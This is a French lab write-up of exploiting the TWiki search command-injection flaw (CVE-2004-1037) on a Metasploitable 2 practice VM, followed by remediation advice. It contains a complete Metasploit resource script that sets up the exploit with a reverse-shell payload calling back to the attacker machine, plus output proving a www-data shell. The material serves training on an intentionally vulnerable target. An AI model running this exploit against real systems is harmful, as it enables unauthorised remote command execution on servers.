# Write-up — TWiki Search, exécution de commande (Metasploitable 2, port 80)

Cible : `192.168.56.101` (réseau josa `vboxnet0`) · Kali/LHOST : `192.168.56.1`.
CVE-2004-1037 · Résultat : shell **`www-data`** (RCE).

> Réseau : services de josa sur `vboxnet0` (`192.168.56.0/24`). MS2 = `192.168.56.101`.
> Même famille que le TWiki de MS1 (déjà traité par josa), ici reconfirmé sur MS2.

**C'est quoi ?** TWiki est un wiki en Perl. Sa fonction de **recherche** évalue l'expression
fournie d'une manière qui permet d'injecter du code Perl/shell (via des métacaractères comme
les backticks) : une recherche forgée fait **exécuter une commande arbitraire** côté serveur,
sans authentification.

---

## 1. Recon

TWiki est listé sur la page d'accueil (`http://192.168.56.101/twiki/`, HTTP 200).

```bash
searchsploit twiki
```
```
TWiki 20030201 - 'search.pm' Remote Command Execution   | cgi/webapps/642.pl
TWiki - Search Function Arbitrary Command Execution ...  | php/webapps/16894.rb
```

Une exécution de commande via la fonction de recherche existe. Chemin du module dans
`msfconsole` :

```bash
msfconsole -q -x "search twiki; exit"
```
```
4  exploit/unix/webapp/twiki_search  2004-10-01  excellent  Yes  TWiki Search Function Arbitrary Command Execution
```

## 2. CVE et mécanisme

```bash
msfconsole -q -x "info exploit/unix/webapp/twiki_search; exit"
```
```
Name: TWiki Search Function Arbitrary Command Execution
References:
  https://nvd.nist.gov/vuln/detail/CVE-2004-1037
  https://twiki.org/cgi-bin/view/Codev/SecurityAlertExecuteCommandsWithSearch
```

**CVE-2004-1037.** La fonction `search` de TWiki passe l'expression de recherche à une
évaluation Perl insuffisamment filtrée ; en y glissant des backticks, on fait exécuter une
commande shell par le serveur web (`www-data`). Pas d'authentification nécessaire.

## 3. Exploiter

🖥 Kali — via resource script :
```bash
cat > /tmp/twiki.rc << 'EOF'
use exploit/unix/webapp/twiki_search
set RHOSTS 192.168.56.101
set RPORT 80
set URI /twiki/bin
set payload cmd/unix/reverse
set LHOST 192.168.56.1
set LPORT 4448
run -z
sessions -c "id; uname -a; hostname; whoami" -i 1
exit -y
EOF
msfconsole -q -r /tmp/twiki.rc
```

Résultat :
```
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Command shell session 1 opened (192.168.56.1:4448 -> 192.168.56.101:49053)
```

La phase `check` du module confirme la vulnérabilité, puis l'envoi de la recherche forgée
ouvre le shell. `URI /twiki/bin` est le chemin des scripts CGI de TWiki (valeur par défaut du
module, correcte ici).

## 4. Preuve d'accès

```
[*] Running 'id; uname -a; hostname; whoami' on shell session 1 (192.168.56.101)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
metasploitable
www-data
```

→ Shell **`www-data`** : la commande injectée s'exécute avec les droits du serveur web. Même
faille que le TWiki de MS1 (CVE-2004-1037), reconfirmée sur MS2.

## 5. Remédiation (résumé)

Mettre à jour TWiki (versions postérieures corrigent l'évaluation de la recherche) ;
n'évaluer aucune entrée utilisateur en Perl, filtrer strictement l'expression de recherche ;
restreindre l'exposition réseau et appliquer le moindre privilège au serveur web.

---

**Pour rejouer :** `./start.sh`, localiser l'IP, puis l'étape 3.
